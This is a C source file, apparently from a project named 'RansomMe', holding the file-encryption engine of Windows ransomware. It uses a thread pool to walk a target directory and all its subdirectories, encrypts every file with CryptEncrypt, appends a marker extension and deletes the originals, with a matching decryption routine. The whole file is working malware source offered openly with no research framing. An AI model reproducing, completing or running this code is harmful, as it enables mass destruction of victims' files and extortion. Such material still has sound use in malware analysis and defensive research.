#include "RansomMe.h"

// Struct with all the parameters to be passed to the FileEncryptWorker callback function
typedef struct {
    char filePath[MAX_PATH];            // path of the file to be encrypted
    const char* cryptoFileExt;          // extension to be appended to the encrypted file
    HCRYPTKEY hKey;                     // encryption key
    HANDLE available;                   // signal to tell the WaitForSingleObject function that the struct is available (not being used by other thread)
    BOOL success;                       // true if the file was successfully encrypted
} FileEncryptTask;

// static functions
static VOID CALLBACK FileEncryptWorker(PTP_CALLBACK_INSTANCE instance, PVOID parameter, PTP_WORK work);
static VOID CALLBACK FileDecryptWorker(PTP_CALLBACK_INSTANCE instance, PVOID parameter, PTP_WORK work);
static size_t EncryptAllFiles(char* targetDir, const char* cryptoFileExt, size_t* encryptedFileNumber, HCRYPTKEY hKey, TP_CALLBACK_ENVIRON* poolEnv, FileEncryptTask* taskPool);
static size_t DecryptAllFiles(char* targetDir, const char* cryptoFileExt, size_t* decryptedFileNumber, HCRYPTKEY hKey, TP_CALLBACK_ENVIRON* poolEnv, FileEncryptTask* taskPool);

// initialize the threadpool, poolEnv will point to the pool environment and cleanupgroup to the cleanup group handler
BOOL InitThreadPool(TP_CALLBACK_ENVIRON* poolEnv, PTP_CLEANUP_GROUP* cleanupgroup) {
    PTP_POOL pool = NULL;       // the pool pointer used in CreateThreadPool

    // Create thread pool   
    pool = CreateThreadpool(NULL);
    if (!pool) {
        printf("Error: Failed to create thread pool. Error Code: %lu\n", GetLastError());
        return FALSE;
    }

    // Create thread pool environment
    InitializeThreadpoolEnvironment(poolEnv);
    SetThreadpoolThreadMaximum(pool, MAX_THREADS); // Set maximum threads

    // Set minimum threads
    if (!SetThreadpoolThreadMinimum(pool, MIN_THREADS)) {
        printf("SetThreadpoolThreadMinimum failed. LastError: %lu\n", GetLastError());
        CloseThreadpool(pool);
        return FALSE;
    }

    // Create a cleanup group
    *cleanupgroup = CreateThreadpoolCleanupGroup();
    if (cleanupgroup == NULL) {
        printf("CreateThreadpoolCleanupGroup failed. LastError: %lu\n", GetLastError());
        CloseThreadpool(pool);
        return FALSE;
    }

    // Associate the callback environment with our thread pool.
    SetThreadpoolCallbackPool(poolEnv, pool);

    // Associate the cleanup group with our thread pool.
    // Objects created with the same callback environment
    // as the cleanup group become members of the cleanup group.
    SetThreadpoolCallbackCleanupGroup(poolEnv, *cleanupgroup, NULL);

    return TRUE;
}

// This function will initialize the FileEncryptTask structs and call EncryptAllFiles. Finally it will securely close the thread handlers and finish up the encrypted files count
size_t StartEncryptionWithThreads(char* targetDir, const char* cryptoFileExt, size_t* encryptedFileNumber, HCRYPTKEY hKey, TP_CALLBACK_ENVIRON* poolEnv, PTP_CLEANUP_GROUP cleanupgroup) {
    size_t fileCount = 0;
    HCRYPTKEY* hKeys = NULL;
    FileEncryptTask* taskPool = NULL;

    // Allocate memory for the array of FileEncryptTask structs
    taskPool = (FileEncryptTask*)malloc(MAX_THREADS * sizeof(FileEncryptTask));
    if (taskPool == NULL) {
        printf("Failed to allocate memory for FileEncryptTask struct array.\n");
        return fileCount;
    }

    // Allocate memory for the array of HCRYPTKEY handles
    hKeys = (HCRYPTKEY*)malloc(MAX_THREADS * sizeof(HCRYPTKEY));
    if (hKeys == NULL) {
        printf("Failed to allocate memory for HCRYPTKEY array.\n");
        return fileCount;
    }

    // Initialize the taskPool array
    for (int i = 0; i < MAX_THREADS; i++) {
        taskPool[i].filePath[0] = '\0';                                 // initialize file path as empty
        taskPool[i].cryptoFileExt = cryptoFileExt;                      // the crypto extension
        CryptDuplicateKey(hKey, NULL, 0, &hKeys[i]);                    // duplicate the key for each thread - CryptEncrypt is not thread-safe according to MS
        taskPool[i].hKey = hKeys[i];                                    // the encryption key for each thread will be a copy of the key
        taskPool[i].success = FALSE;                                    // initialize success as false, this will be used to count the total encrypted files

        // Setup an event to tell WaitForSingleObject when a struct is available
        taskPool[i].available = CreateEvent(NULL, TRUE, TRUE, NULL);    // Manual reset, initially signaled
        if (!taskPool[i].available) {
            printf("Error: Failed to create event for task pool. Error Code: %lu\n", GetLastError());
            return 0;
        }
    }

    // Call the encryption function
    fileCount = EncryptAllFiles(targetDir, cryptoFileExt, encryptedFileNumber, hKey, poolEnv, taskPool);

    // Clean up the thread pool, this will wait for all callbacks to finish, even those that are waiting to start
    if (cleanupgroup) {
        CloseThreadpoolCleanupGroupMembers(cleanupgroup, FALSE, NULL);
    }

    // Add the results from the last task of each thread
    for (int i = 0; i < MAX_THREADS; i++) {
        if (taskPool[i].success) { (*encryptedFileNumber)++; }
    }

    // Cleanup the key copies
    for (int i = 0; i < MAX_THREADS; i++) {
        if (hKeys[i] != 0) {
            CryptDestroyKey(hKeys[i]);
        }
    }

    // free allocated memory
    free(hKeys);
    free(taskPool);

    return fileCount;
}

// this will initialize the FileEncryptTask structs and call DecryptAllFiles. Finally it will securely close the thread handlers and finish up the decrypted files count
size_t startDecryptionWithThreads(char* targetDir, const char* cryptoFileExt, size_t* decryptedFileNumber, HCRYPTKEY hKey, TP_CALLBACK_ENVIRON* poolEnv, PTP_CLEANUP_GROUP cleanupgroup) {
    size_t fileCount = 0;
    HCRYPTKEY* hKeys = NULL;
    FileEncryptTask* taskPool = NULL;

    // Allocate memory for the array of FileEncryptTask structs
    taskPool = (FileEncryptTask*)malloc(MAX_THREADS * sizeof(FileEncryptTask));
    if (taskPool == NULL) {
        printf("Failed to allocate memory for FileEncryptTask struct array.\n");
        return fileCount;
    }

    // Allocate memory for the array of HCRYPTKEY handles
    hKeys = (HCRYPTKEY*)malloc(MAX_THREADS * sizeof(HCRYPTKEY));
    if (hKeys == NULL) {
        printf("Failed to allocate memory for HCRYPTKEY array.\n");
        return fileCount;
    }

    for (int i = 0; i < MAX_THREADS; i++) {
        taskPool[i].filePath[0] = '\0';                                 // initialize file path as empty
        taskPool[i].cryptoFileExt = cryptoFileExt;                      // the crypto extension
        CryptDuplicateKey(hKey, NULL, 0, &hKeys[i]);                    // duplicate the key for each thread - CryptDecrypt is not thread-safe according to MS
        taskPool[i].hKey = hKeys[i];                                    // the encryption key for each thread will be a copy of the key
        taskPool[i].success = FALSE;                                    // initialize success as false, this will be used to count the total decrypted files

        // Setup an event to tell WaitForSingleObject when a struct is available
        taskPool[i].available = CreateEventA(NULL, TRUE, TRUE, NULL);    // Manual reset, initially signaled
        if (!taskPool[i].available) {
            printf("Error: Failed to create event for task pool. Error Code: %lu\n", GetLastError());
            return 0;
        }
    }

    fileCount = DecryptAllFiles(targetDir, cryptoFileExt, decryptedFileNumber, hKey, poolEnv, taskPool);

    // Clean up the thread pool, this will wait for all callbacks to finish, even those that are waiting to start
    if (cleanupgroup) {
        CloseThreadpoolCleanupGroupMembers(cleanupgroup, FALSE, NULL);
    }

    // Add the results from the last task of each thread
    for (int i = 0; i < MAX_THREADS; i++) {
        if (taskPool[i].success) { (*decryptedFileNumber)++; }
    }

    // Cleanup the key copies
    for (int i = 0; i < MAX_THREADS; i++) {
        if (hKeys[i] != 0) {
            CryptDestroyKey(hKeys[i]);
        }
    }

    // free allocated memory
    free(hKeys);
    free(taskPool);

    return fileCount;
}

// The callback function to be called by CreateThreadpoolWork when a new work sent to the pool
static VOID CALLBACK FileEncryptWorker(PTP_CALLBACK_INSTANCE instance, PVOID parameter, PTP_WORK work) {
    UNREFERENCED_PARAMETER(instance);                               // instance will not be used
    UNREFERENCED_PARAMETER(work);                                   // work will not be used
    FileEncryptTask* taskParam = (FileEncryptTask*)parameter;       // taskParam will point to the FileEncryptTask struct

    //--------------- the encryptmyfile code

    HANDLE hInputFile = INVALID_HANDLE_VALUE;       // input file handler
    HANDLE hOutputFile = INVALID_HANDLE_VALUE;      // output file handler

    BYTE buffer[CHUNK_SIZE];                        // buffer to read from file, encrypt and write into file
    DWORD bytesRead = 0, bytesWritten = 0;          // number of bytes read/written return by CreateFile and CryptEncrypt
    BOOL finalChunk = FALSE;                        // flag to tell CryptEncrypt that it is the final chunk (smaller than the rest)

    char outputFileName[MAX_PATH] = "";             // output file name

    // the output file will be the original file plus the crypted extension appended
    strcpy_s(outputFileName, MAX_PATH, taskParam->filePath);
    if (my_strcat_s(outputFileName, MAX_PATH, taskParam->cryptoFileExt) != 0) {
        printf("Cannot append the crypted extension to file name %s.\n", outputFileName);
        goto cleanup;
    }

    // Open the input file
    hInputFile = CreateFileA(taskParam->filePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hInputFile == INVALID_HANDLE_VALUE) {
        printf("Error: Could not open input file %s. Error Code: %lu\n", taskParam->filePath, GetLastError());
        goto cleanup;
    }

    // Open the output file
    hOutputFile = CreateFileA(outputFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOutputFile == INVALID_HANDLE_VALUE) {
        printf("Error: Could not open output file %s. Error Code: %lu\n", outputFileName, GetLastError());
        goto cleanup;
    }

    // Encrypt and write the file data in chunks
    while (ReadFile(hInputFile, buffer, CHUNK_SIZE, &bytesRead, NULL) && bytesRead > 0) {
        finalChunk = (bytesRead < CHUNK_SIZE);  // the final chunk will be smaller thant CHUNK_SIZE

        // Encrypt the chunk
        if (!CryptEncrypt(taskParam->hKey, 0, finalChunk, 0, buffer, &bytesRead, CHUNK_SIZE)) {
            printf("Error: CryptEncrypt failed. Error Code: %lu\n", GetLastError());
            printf("Failure encrypting file %s\n", taskParam->filePath);
            goto cleanup;
        }

        // Write the encrypted chunk to the output file
        if (!WriteFile(hOutputFile, buffer, bytesRead, &bytesWritten, NULL) || bytesWritten != bytesRead) {
            printf("Error: WriteFile failed. Error Code: %lu\n", GetLastError());
            printf("Failure writing to file %s\n", outputFileName);
            goto cleanup;
        }
    }

    // set success to true because the encryption went ok
    taskParam->success = TRUE;
    //    printf("\rFile %s encrypted successfully.", inputFileName);
    //    fflush(stdout);

cleanup:
    // Release the file handlers
    if (hInputFile != INVALID_HANDLE_VALUE) CloseHandle(hInputFile);
    if (hOutputFile != INVALID_HANDLE_VALUE) CloseHandle(hOutputFile);

    // Delete the input file only if the decryption was successful
    if (taskParam->success == TRUE) {
        if (!DeleteFileA(taskParam->filePath)) {
            printf("Error: Could not delete input file %s. Error Code: %lu\n", taskParam->filePath, GetLastError());
        }
    }
    // if something went wrong delete the created file if it was created
    else {
        if (!DeleteFileA(outputFileName)) {
            printf("Error: Could not delete output file %s. Error Code: %lu\n", outputFileName, GetLastError());
        }
    }
    // ---------------------------------------------
    taskParam->filePath[0] = '\0';          // clear the file name (this is optional)
    SetEvent(taskParam->available);         // set the struct as available
    return;
}

// The callback function to be called by CreateThreadpoolWork when a new work sent to the pool
static VOID CALLBACK FileDecryptWorker(PTP_CALLBACK_INSTANCE instance, PVOID parameter, PTP_WORK work) {
    UNREFERENCED_PARAMETER(instance);                               // instance will not be used
    UNREFERENCED_PARAMETER(work);                                   // work will not be used
    FileEncryptTask* taskParam = (FileEncryptTask*)parameter;       // taskParam will point to the FileEncryptTask struct

    //--------------- the decryptmyfile code
    HANDLE hInputFile = INVALID_HANDLE_VALUE;                           // input file handler
    HANDLE hOutputFile = INVALID_HANDLE_VALUE;                          // output file handler

    BYTE buffer[CHUNK_SIZE];                                            // buffer to read from file, decrypt and write into file
    DWORD bytesRead = 0, bytesWritten = 0;                              // number of bytes read/written return by CreateFile and CryptDecrypt
    BOOL finalChunk = FALSE;                                            // flag to tell CryptDecrypt that it is the final chunk (smaller than the rest)

    char outputFileName[MAX_PATH] = "";                                 // output file name
    const char* inputFileExt = strrchr(taskParam->filePath, '.');       // this will point to the last '.' of taskParam->filePath, where the crypted extension begins

    // if the input file does not contain the crypted extension, skip the decryption
    if (strcmp(inputFileExt, taskParam->cryptoFileExt)) { goto cleanup; }
    else {
        // The outputFileName will be the inputFileName without the cryptoFileExt
        strncpy_s(outputFileName, MAX_PATH, taskParam->filePath, inputFileExt - taskParam->filePath);

        // Open the input file
        hInputFile = CreateFileA(taskParam->filePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hInputFile == INVALID_HANDLE_VALUE) {
            printf("Error: Could not open input file %s. Error Code: %lu\n", taskParam->filePath, GetLastError());
            goto cleanup;
        }

        // Open the output file
        hOutputFile = CreateFileA(outputFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hOutputFile == INVALID_HANDLE_VALUE) {
            printf("Error: Could not open output file %s. Error Code: %lu\n", outputFileName, GetLastError());
            goto cleanup;
        }

        // Decrypt and write the file data in chunks
        while (ReadFile(hInputFile, buffer, CHUNK_SIZE, &bytesRead, NULL) && bytesRead > 0) {
            finalChunk = (bytesRead < CHUNK_SIZE);  // the final chunk will be smaller thant CHUNK_SIZE

            // Decrypt the chunk
            if (!CryptDecrypt(taskParam->hKey, 0, finalChunk, 0, buffer, &bytesRead)) {
                printf("Error: CryptDecrypt failed. Error Code: %lu\n", GetLastError());
                printf("Failure decrypting file %s\n", taskParam->filePath);
                goto cleanup;
            }

            // Write the decrypted chunk to the output file
            if (!WriteFile(hOutputFile, buffer, bytesRead, &bytesWritten, NULL) || bytesWritten != bytesRead) {
                printf("Error: WriteFile failed. Error Code: %lu\n", GetLastError());
                printf("Failure writing to file %s\n", outputFileName);
                goto cleanup;
            }
        }
    }

    // set success to true because the decryption went ok
    taskParam->success = TRUE;
    //    printf("\rFile %s decrypted successfully.", inputFileName);
    //    fflush(stdout);

cleanup:
    if (hInputFile != INVALID_HANDLE_VALUE) CloseHandle(hInputFile);
    if (hOutputFile != INVALID_HANDLE_VALUE) CloseHandle(hOutputFile);

    // Delete the input file only if the decryption was successful
    if (taskParam->success == TRUE) {
        if (!DeleteFileA(taskParam->filePath)) {
            printf("Error: Could not delete input file %s. Error Code: %lu\n", taskParam->filePath, GetLastError());
        }
    }
    // if something went wrong delete the created file if it was created
    else {
        if (!DeleteFileA(outputFileName)) {
            printf("Error: Could not delete output file %s. Error Code: %lu\n", outputFileName, GetLastError());
        }
    }
    // ------------------------------------------------------
    taskParam->filePath[0] = '\0';          // clear the file name (this is optional)
    SetEvent(taskParam->available);         // set the struct as available
    return;
}

// given a target directory this will crawl into it and call EncryptMyFile for every file found on it and its subdirectories
static size_t EncryptAllFiles(char* targetDir, const char* cryptoFileExt, size_t* encryptedFileNumber, HCRYPTKEY hKey, TP_CALLBACK_ENVIRON* poolEnv, FileEncryptTask* taskPool) {
    WIN32_FIND_DATAA foundFileData;          // WIN32_FIND_DATA containing the file/directory info
    HANDLE hFind = INVALID_HANDLE_VALUE;     // search handle to be used with findNextFile

    size_t fileCount = 0;                    // number of files found

    char targetSubDir[MAX_PATH] = "";        // temporary variable to store the subdir
    char findTargetDir[MAX_PATH] = "";       // just to add an asterisk to the end of the targetDir but without affecting the original string
    char fullFileName[MAX_PATH] = "";        // the full file name with path to pass to EncryptMyFile

    PTP_WORK work = NULL;
    FileEncryptTask* task = NULL;

    // if targetDir does not end with \ we will add it as it will be more convinient later
    if (targetDir[strlen(targetDir)] != '\\') {
        if (my_strcat_s(targetDir, MAX_PATH, "\\") != 0) {
            printf("Skipping directory %s. Cannot append '\\'. Name might be too long.\n", targetDir);
            return fileCount;
        }
    }
    // creating a copy of the dir and adding * to the end to pass it to the FindFirstFile function
    strcpy_s(findTargetDir, MAX_PATH, targetDir);
    if (my_strcat_s(findTargetDir, MAX_PATH, "*") != 0) {
        printf("Skipping directory %s. Cannot append '*'. Name might be too long.\n", targetDir);
        return fileCount;
    }

    // Find the first file in the directory.
    hFind = FindFirstFileA(findTargetDir, &foundFileData);

    if (INVALID_HANDLE_VALUE == hFind) {
        printf("Error: FindFirstFile failed. Error Code: %lu\n", GetLastError());
        return fileCount;
    }

    do {
        // check if it is a directory
        if (foundFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            // Skip "." and ".." directories
            if (strcmp(foundFileData.cFileName, ".") == 0 || strcmp(foundFileData.cFileName, "..") == 0) {
                continue;
            }
            // If it's a directory, append the folder name to the original target dir
            strcpy_s(targetSubDir, MAX_PATH, targetDir);
            if (my_strcat_s(targetSubDir, MAX_PATH, foundFileData.cFileName) != 0) {
                printf("Skipping directory %s. Cannot append subdir %s. Name might be too long.\n", targetDir, foundFileData.cFileName);
                continue;
            }

            // recursively call with every subfolder and add the number to the total files
            fileCount += EncryptAllFiles(targetSubDir, cryptoFileExt, encryptedFileNumber, hKey, poolEnv, taskPool);
        }
        else {
            // If it's a file, encrypt it
            // Point the next available struct to task. A round robin is used with fileCount % MAX_THREADS
            task = &taskPool[fileCount % MAX_THREADS];
            // Block until the event is signaled
            WaitForSingleObject(task->available, INFINITE);

            // Add 1 to the encrypted file count if the previous one returned success
            if (task->success) { (*encryptedFileNumber)++; }

            // Mark the task as in-use by resetting the event
            ResetEvent(task->available);

            // Copy the current dir and append the found file name to task->filePath
            strcpy_s(task->filePath, MAX_PATH, targetDir);
            if (my_strcat_s(task->filePath, MAX_PATH, foundFileData.cFileName) != 0) {
                printf("Skipping file %s in dir %s. Name might be too long.\n", foundFileData.cFileName, targetDir);
                task->filePath[0] = '\0';   // Clear the filePath in case of failure
                SetEvent(task->available);  // Mark the task as free in case of failure
                continue;
            }

            // Submit the task to the thread pool
            work = CreateThreadpoolWork(FileEncryptWorker, task, poolEnv);
            if (!work) {
                printf("Error: Failed to create thread pool work. Error Code: %lu\n", GetLastError());
                task->filePath[0] = '\0';   // Clear the filePath in case of failure
                SetEvent(task->available);  // Mark the task as free in case of failure
                continue;
            }

            // Submit the work
            SubmitThreadpoolWork(work);

            fileCount++;
        }
    } while (FindNextFileA(hFind, &foundFileData) != 0);

    // Close the search handle
    FindClose(hFind);

    // Return the total files found
    return fileCount;
}

// given a target directory this will crawl into it and call DecryptMyFile for every file found on it and its subdirectories
static size_t DecryptAllFiles(char* targetDir, const char* cryptoFileExt, size_t* decryptedFileNumber, HCRYPTKEY hKey, TP_CALLBACK_ENVIRON* poolEnv, FileEncryptTask* taskPool) {
    WIN32_FIND_DATAA foundFileData;          // WIN32_FIND_DATA containing the file/directory info
    HANDLE hFind = INVALID_HANDLE_VALUE;     // search handle to be used with findNextFile

    size_t fileCount = 0;                    // number of files found

    char targetSubDir[MAX_PATH] = "";        // temporary variable to store the subdir
    char findTargetDir[MAX_PATH] = "";       // just to add an asterisk to the end of the targetDir but without affecting the original string
    char fullFileName[MAX_PATH] = "";        // the full file name with path to pass to DecryptMyFile

    PTP_WORK work = NULL;
    FileEncryptTask* task = NULL;

    // if targetDir does not end with \ we will add it as it will be more convinient later
    if (targetDir[strlen(targetDir)] != '\\') {
        if (my_strcat_s(targetDir, MAX_PATH, "\\") != 0) {
            printf("Skipping directory %s. Cannot append '\\'. Name might be too long.\n", targetDir);
            return fileCount;
        }
    }
    // creating a copy of the dir and adding * to the end to pass it to the FindFirstFile function
    strcpy_s(findTargetDir, MAX_PATH, targetDir);
    if (my_strcat_s(findTargetDir, MAX_PATH, "*") != 0) {
        printf("Skipping directory %s. Cannot append '*'. Name might be too long.\n", targetDir);
        return fileCount;
    }

    // Find the first file in the directory.
    hFind = FindFirstFileA(findTargetDir, &foundFileData);

    if (INVALID_HANDLE_VALUE == hFind) {
        printf("Error: FindFirstFile failed. Error Code: %lu\n", GetLastError());
        return fileCount;
    }

    do {
        // check if it is a directory
        if (foundFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            // Skip "." and ".." directories
            if (strcmp(foundFileData.cFileName, ".") == 0 || strcmp(foundFileData.cFileName, "..") == 0) {
                continue;
            }
            // If it's a directory, append the folder name to the original target dir
            strcpy_s(targetSubDir, MAX_PATH, targetDir);
            if (my_strcat_s(targetSubDir, MAX_PATH, foundFileData.cFileName) != 0) {
                printf("Skipping directory %s. Cannot append subdir %s. Name might be too long.\n", targetDir, foundFileData.cFileName);
                continue;
            }

            // recursively call with every subfolder and add the number to the total files
            fileCount += DecryptAllFiles(targetSubDir, cryptoFileExt, decryptedFileNumber, hKey, poolEnv, taskPool);
        }
        else {
            // If it's a file, decrypt it
            // Point the next available struct to task. A round robin is used with fileCount % MAX_THREADS
            task = &taskPool[fileCount % MAX_THREADS];
            // Block until the event is signaled
            WaitForSingleObject(task->available, INFINITE);

            // Add 1 to the decrypted file count if the previous one returned success
            if (task->success) { (*decryptedFileNumber)++; }

            // Mark the task as in-use by resetting the event
            ResetEvent(task->available);

            // Copy the current dir and append the found file name to task->filePath
            strcpy_s(task->filePath, MAX_PATH, targetDir);
            if (my_strcat_s(task->filePath, MAX_PATH, foundFileData.cFileName) != 0) {
                printf("Skipping file %s in dir %s. Name might be too long.\n", foundFileData.cFileName, targetDir);
                task->filePath[0] = '\0';   // Clear the filePath in case of failure
                SetEvent(task->available);  // Mark the task as free in case of failure
                continue;
            }

            // Submit the task to the thread pool
            work = CreateThreadpoolWork(FileDecryptWorker, task, poolEnv);
            if (!work) {
                printf("Error: Failed to create thread pool work. Error Code: %lu\n", GetLastError());
                task->filePath[0] = '\0';   // Clear the filePath in case of failure
                SetEvent(task->available);  // Mark the task as free in case of failure
                continue;
            }

            // Submit the work
            SubmitThreadpoolWork(work);

            fileCount++;
        }
    } while (FindNextFileA(hFind, &foundFileData) != 0);

    // Close the search handle
    FindClose(hFind);

    // Return the total files found
    return fileCount;
}